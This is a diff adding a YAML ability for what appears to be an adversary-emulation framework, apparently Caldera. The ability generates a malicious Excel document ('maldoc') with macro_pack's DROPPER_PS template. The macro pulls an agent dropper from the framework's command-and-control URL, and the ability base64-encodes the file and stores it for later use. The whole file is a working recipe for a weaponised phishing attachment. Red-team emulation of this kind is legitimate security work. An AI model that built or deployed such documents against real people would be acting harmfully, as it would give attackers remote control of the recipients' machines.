@@ -1,0 +1,23 @@
+- id: ebd7ebd0-2a8e-4f83-adc0-4e13cbd47082
+  name: Generate maldoc
+  description: Generate maldoc containing agent dropper
+  tactic: resource-development
+  technique:
+    attack_id: T1587.001
+    name: "Develop Capabilities: Malware"
+  # Requires MS Office to be available on the initial agent generating the payload
+  platforms:
+    windows:
+      psh:
+        command: |
+          $attachment_path = "attachment.xls";
+          echo "#{app.contact.http}/plugin/precomp/dropper" | .\macro_pack.exe -o -t DROPPER_PS -G $attachment_path -q;
+          [convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Content -path $attachment_path)));
+        timeout: 60
+        cleanup: "rm $attachment_path"
+        payloads:
+          - macro_pack.exe
+        # Store generated maldoc as base64 in knowledge model for later use
+        parsers:
+          plugins.precomp.app.parsers.basic:
+            - source: internal.payloads.maldoc-b64
